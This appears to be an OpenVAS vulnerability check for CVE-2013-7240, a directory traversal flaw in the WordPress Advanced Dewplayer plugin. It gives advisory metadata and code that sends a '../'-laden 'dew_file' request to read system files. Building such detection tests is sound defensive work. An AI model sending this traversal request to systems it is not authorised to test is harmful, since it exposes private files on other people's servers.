###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_dewplayer_dir_trav_vuln.nasl 34182 2014-01-07 16:29:23Z Jan$
#
# WordPress Advanced Dewplayer 'dew_file' Directory Traversal Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804058");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2013-7240");
  script_bugtraq_id(64587);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-01-07 16:29:23 +0530 (Tue, 07 Jan 2014)");
  script_name("WordPress Advanced Dewplayer 'dew_file' Directory Traversal Vulnerability");


  script_tag(name:"summary", value:"This host is installed with Wordpress Advanced Dewplayer Plugin and is prone
to directory traversal vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
local file or not.");
  script_tag(name:"solution", value:"Upgrade to WordPress Advanced Dewplayer 1.3 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"insight", value:"Flaw is due to the 'download-file.php' script not properly sanitizing user
input, specifically path traversal style attacks (e.g. '../') supplied via
the 'dew_file' parameter.");
  script_tag(name:"affected", value:"WordPress Advanced Dewplayer 1.2, Other versions may also be affected.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to read arbitrary files
on the target system.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/55941");
  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2013/q4/566");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://wordpress.org/plugins/advanced-dewplayer");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

files = traversal_files();

foreach file (keys(files))
{
  url = dir + "/wp-content/plugins/advanced-dewplayer/admin-panel" +
        "/download-file.php?dew_file=" + crap(data:"../",length:3*15) +
        files[file];

  if(http_vuln_check(port:http_port, url:url, pattern:file))
  {
    security_message(port:http_port);
    exit(0);
  }
}
